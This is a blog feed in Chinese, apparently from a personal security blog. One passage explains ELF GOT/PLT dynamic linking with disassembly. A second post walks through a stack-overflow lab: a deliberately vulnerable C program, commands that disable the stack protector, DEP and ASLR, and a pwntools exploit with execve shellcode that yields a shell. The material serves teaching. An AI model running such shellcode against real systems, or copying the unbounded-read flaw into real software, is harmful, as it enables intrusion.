+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extern int foo;//外部变量
+
+int function()
+{
+	return foo;
+}
+
+$ gcc -fPIC -shared -o libtest3.so test3.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;接着反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest3.so
+...
+000004f0 &amp;lt;function&amp;gt;:
+ 4f0:	55                   	push   %ebp
+ 4f1:	89 e5                	mov    %esp,%ebp
+ 4f3:	e8 0f 00 00 00       	call   507 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 4f8:	05 08 1b 00 00       	add    $0x1b08,%eax
+ 4fd:	8b 80 f4 ff ff ff    	mov    -0xc(%eax),%eax
+ 503:	8b 00                	mov    (%eax),%eax
+ 505:	5d                   	pop    %ebp
+ 506:	c3                   	ret
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;仔细观察可以发现&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest2.so&lt;/code&gt;还是有点区别的。调用__x86.get_pc_thunk.ax之后
+&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;值是0x4f8, &lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt; + 0x1b08 = 0x2000，0x2000 - 0x0c = 0x1ff4。也就是说0x1ff4处存放的应该是
+foo的值。查看&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;的重定位表可以发现0x1ff4处是一个类型为&lt;code class=&quot;highlighter-rouge&quot;&gt;R_386_GLOB_DAT&lt;/code&gt;的值。当
+&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;被加载时，动态链接器会检查重定位表，并将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值放到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;条目中的对应位置(0x1ff4).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -R libtest3.so
+
+DYNAMIC RELOCATION RECORDS
+...
+OFFSET   TYPE              VALUE
+00001ff4 R_386_GLOB_DAT    foo
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;从这个例子可以发现位置无关代码引用外部的变量与代码加载到内存的位置无关，因为代码指定从&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;
+中取数据，因为不能修改共享的代码，而&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;属于数据，可以对其进行写操作，所以只要在加载时让动
+态链接器找到对应的变量的值并存入到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;中，那么代码就可以引用了。这样就能保证在不修改代码的
+情况下完成数据的访问。&lt;/p&gt;
+
+&lt;h4 id=&quot;模块间函数调用&quot;&gt;&lt;a href=&quot;#模块间函数调用&quot;&gt;模块间函数调用&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;对于动态库函数的引用，理论上讲可以采用和&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问&lt;/a&gt;一样的方法来实现函数地址
+解析，但是ELF采用了另外一种更复杂而又精妙的方法。不仅要使用&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表，还用到了&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表。&lt;/p&gt;
+
+&lt;p&gt;再看一个例子：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test.c
+extern int foo;
+
+int function(void)
+{
+	return foo;
+}
+
+$ gcc -fPIC -shared -o libtest4.so test4.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;还是将&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest4.so&lt;/code&gt;反汇编进行分析。可以看到对&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;函数的调用是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;foo@plt&lt;/code&gt;来定位&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest4.so
+...
+00000500 &amp;lt;function&amp;gt;:
+ 500:	55                   	push   %ebp
+ 501:	89 e5                	mov    %esp,%ebp
+ 503:	53                   	push   %ebx
+ 504:	83 ec 04             	sub    $0x4,%esp
+ 507:	e8 12 00 00 00       	call   51e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 50c:	05 f4 1a 00 00       	add    $0x1af4,%eax
+ 511:	89 c3                	mov    %eax,%ebx
+ 513:	e8 98 fe ff ff       	call   3b0 &amp;lt;foo@plt&amp;gt;
+ 518:	83 c4 04             	add    $0x4,%esp
+ 51b:	5b                   	pop    %ebx
+ 51c:	5d                   	pop    %ebp
+ 51d:	c3                   	ret
+...
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;存放的是0x50c, &lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;存放的是&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;+0x1af4 = 0x2000。使用&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf --sections&lt;/code&gt;可以看到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt;的
+地址就是0x2000,其实0x2000就是&lt;code class=&quot;highlighter-rouge&quot;&gt;过程链接表&lt;/code&gt;(Procedure Linkage Table, PLT)。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --sections libtest4.so
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  ...
+  [20] .got              PROGBITS        00001fec 000fec 000014 04  WA  0   0  4
+  [21] .got.plt          PROGBITS        00002000 001000 000010 04  WA  0   0  4
+  ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;和共享库的代码一样是多个进程共享的，也就是说不能改写&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;，但是可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;来改写数据部分来确定
+引用外部符号的绝对地址。并且可执行文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表和共享目标文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;是分开的。利用&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表确定引用的。
+&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;的结构如下:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Procedure Linkage Table
+
+.PLT0:  pushl 4(%ebx)
+        jmp *8(%ebx)
+        nop; nop
+        nop; nop
+.PLT1:  jmp *name1@GOT(%ebx)
+        pushl $offset
+        jmp .PLT0@PC
+.PLT2:  jmp *name2@GOT(%ebx)
+        pushl $offset
+        jmp .PLT0@PC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;来确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址可以分为一下几个步骤：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;将共享库加载到内存，动态连接器将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表的第二项(&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[1]&lt;/code&gt;)和第三项(‘GOT[2]’)分别设置为特殊值。
+&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;也是一个特殊的条目。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;调用者(caller)负责将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;(注意是&lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt;, 不是&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;)表的地址存放在&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;中(注意，ELF规定必须
+将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;的地址放入到&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;而不是其他寄存器)。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 507:	e8 12 00 00 00       	call   51e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 50c:	05 f4 1a 00 00       	add    $0x1af4,%eax
+ 511:	89 c3                	mov    %eax,%ebx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;然后调到&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;条目(&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[1]&lt;/code&gt;)，即&lt;code class=&quot;highlighter-rouge&quot;&gt;foo@plt&lt;/code&gt;。当首次调用&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;前，&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表存放的是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的
+&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;条目的第二条指令&lt;code class=&quot;highlighter-rouge&quot;&gt;pushl 0x00&lt;/code&gt;的地址，而不是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的绝对地址。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# foo 的 PLT
+000003b0 &amp;lt;foo@plt&amp;gt;:
+ 3b0:	ff a3 0c 00 00 00    	jmp    *0xc(%ebx)
+ 3b6:	68 00 00 00 00       	push   $0x0
+ 3bb:	e9 e0 ff ff ff       	jmp    3a0 &amp;lt;_init+0x28&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;然后跳转到&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[1]&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;pushl 0x0&lt;/code&gt;指令执行。这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt;是重定位偏移，它是一个非负数。它是和&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;对应的。
+在将重定位偏移量压如stack之后，程序就跳转到了&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;的第第二项&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[1]&lt;/code&gt;(&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;+0x4)压入
+stack中。然后跳转到&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[2]&lt;/code&gt;(&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;+0x8)处,&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[2]&lt;/code&gt;将控制权交给动态链接器。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# PLT[0]
+000003a0 &amp;lt;foo@plt-0x10&amp;gt;:
+ 3a0:	ff b3 04 00 00 00    	pushl  0x4(%ebx)
+ 3a6:	ff a3 08 00 00 00    	jmp    *0x8(%ebx)
+ 3ac:	00 00                	add    %al,(%eax)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;当动态链接器拿到控制权之后会根据压入stack的参数来确定引用的符号的值，然后将此值写入对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;中，然后将控制
+权还回给用调用程序。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/Triangleowl/picture/blob/master/GOT1.png?raw=true&quot; alt=&quot;第一次调用foo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;至此&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表中存放的已经是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的绝对地址了，当再次代用&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;时就不会像第一次调用这么麻烦，因为&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表中已经
+有&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/Triangleowl/picture/blob/master/GOT2.png?raw=true&quot; alt=&quot;第二次调用foo&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;参考：&lt;br /&gt;
+《深入理解计算机系统》&lt;br /&gt;
+《程序员的自我修养》&lt;br /&gt;
+&lt;a href=&quot;https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html&quot;&gt;PLT and GOT - the key to code sharing and dynamic libraries&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.skyfree.org/linux/references/ELF_Format.pdf&quot;&gt;ELF format&lt;/a&gt;&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">Table Of Contents 链接时重定位 装载时重定位 模块内部数据访问 模块间数据访问 模块间函数调用</summary></entry><entry><title type="html">Return Oriented Programming-1</title><link href="http://localhost:4000/rop/Return-Oriented-Programming" rel="alternate" type="text/html" title="Return Oriented Programming-1" /><published>2019-11-02T00:00:00+08:00</published><updated>2019-11-02T00:00:00+08:00</updated><id>http://localhost:4000/rop/Return-Oriented-Programming</id><content type="html" xml:base="http://localhost:4000/rop/Return-Oriented-Programming">&lt;p&gt;源代码如下:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;$ cat level1.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+void vulnerable_function(){
+    char buf[128];
+    read(STDIN_FILENO, buf, 256);
+}
+int main()
+{
+    vulnerable_function();
+    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;step1编译源文件&quot;&gt;step1:编译源文件&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt;位系统:&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      gcc -fno-stack-protector -zexecstack level1.c -o level1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;64&lt;/code&gt;位系统:&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      gcc -fno-stack-protector -z execstack level1.c -o level1 -m32
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;-fno-stack-protector&lt;/code&gt;作用是关掉stack protector, &lt;code class=&quot;highlighter-rouge&quot;&gt;-zexecstack&lt;/code&gt;作用是关掉&lt;code class=&quot;highlighter-rouge&quot;&gt;DEP&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;step2关闭aslr&quot;&gt;step2:关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;ASLR&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;执行：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      sudo -s
+      echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
+      exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;step3反汇编level1&quot;&gt;step3:反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d level1
+
+0000054d &amp;lt;vulnerable_function&amp;gt;:
+ 54d:	55                   	push   %ebp
+ 54e:	89 e5                	mov    %esp,%ebp
+ 550:	53                   	push   %ebx
+ 551:	81 ec 84 00 00 00    	sub    $0x84,%esp
+ 557:	e8 6a 00 00 00       	call   5c6 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 55c:	05 78 1a 00 00       	add    $0x1a78,%eax
+ 561:	83 ec 04             	sub    $0x4,%esp
+ 564:	68 00 01 00 00       	push   $0x100
+ 569:	8d 95 78 ff ff ff    	lea    -0x88(%ebp),%edx        #the address of buf is $ebp-0x88
+ 56f:	52                   	push   %edx
+ 570:	6a 00                	push   $0x0
+ 572:	89 c3                	mov    %eax,%ebx
+ 574:	e8 57 fe ff ff       	call   3d0 &amp;lt;read@plt&amp;gt;
+ 579:	83 c4 10             	add    $0x10,%esp
+ 57c:	90                   	nop
+ 57d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
+ 580:	c9                   	leave  
+ 581:	c3                   	ret    
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;通过查看&lt;code class=&quot;highlighter-rouge&quot;&gt;vulnerable_function()&lt;/code&gt;的汇编代码可以知道&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址为&lt;code class=&quot;highlighter-rouge&quot;&gt;$ebp-0x88&lt;/code&gt;,即&lt;code class=&quot;highlighter-rouge&quot;&gt;vulnerable_function()&lt;/code&gt;函数的&lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt;分布为：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      |----------------------|
+      |                      |
+      |----------------------|&amp;lt;-----return address(ebp+0x04)
+      |                      |
+      |----------------------|&amp;lt;-----ebp
+      |                      |
+      |                      |
+      |                      |
+      |                      |
+      |                      |
+      |----------------------|&amp;lt;-----buf(ebp-0x88)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;所以只要读入的数据大于&lt;code class=&quot;highlighter-rouge&quot;&gt;0x88+0x04&lt;/code&gt;就覆盖掉返回地址。接下来只要确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址，用&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址覆盖&lt;code class=&quot;highlighter-rouge&quot;&gt;return address&lt;/code&gt;即可将执行&lt;code class=&quot;highlighter-rouge&quot;&gt;buff&lt;/code&gt;内的&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;step4确定buff的地址&quot;&gt;step4:确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buff&lt;/code&gt;的地址&lt;/h3&gt;
+
+&lt;p&gt;这里选用&lt;code class=&quot;highlighter-rouge&quot;&gt;140(0x88+0x04)&lt;/code&gt;个&lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;bbbb&lt;/code&gt;来作为输入，使程序&lt;code class=&quot;highlighter-rouge&quot;&gt;crash&lt;/code&gt;。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;在执行&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;之前要先开启&lt;code class=&quot;highlighter-rouge&quot;&gt;core dump&lt;/code&gt;,具体做法为：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ulimit -c unlimit
+sudo -s
+echo &quot;/tmp/core.%t&quot; &amp;gt; /proc/sys/kernel/core_pattern
+exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;然后执行&lt;code class=&quot;highlighter-rouge&quot;&gt;level1&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+Segmentation fault (core dumped)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;确定&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb ./level1 /tmp/core.xxxxxxxx -q
+Reading symbols from ./level1...(no debugging symbols found)...done.
+[New LWP 30069]
+Core was generated by `./level1'.
+Program terminated with signal SIGILL, Illegal instruction.
+#0  0xffffcf9e in ?? ()
+(gdb) x/s $esp-144
+0xffffcf10:	'a' &amp;lt;repeats 140 times&amp;gt;, &quot;bbbb\n\317\377\377&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;此时已经得到了&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffcf10&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;step5编写exploit&quot;&gt;step5:编写exploit&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat exp.py
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+
+p = process('./level1')
+ret =  0xffffcf10
+
+shellcode  = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+
+payload = shellcode + 'A'*(140-len(shellcode)) + p32(ret)
+
+p.send(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;step6执行结果&quot;&gt;step6:执行结果&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python exp1.py
+[+] Starting local process './level1': pid 16267
+[*] Switching to interactive mode
+$ whoami
+owl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Triangleowl</name></author><summary type="html">源代码如下:</summary></entry></feed>
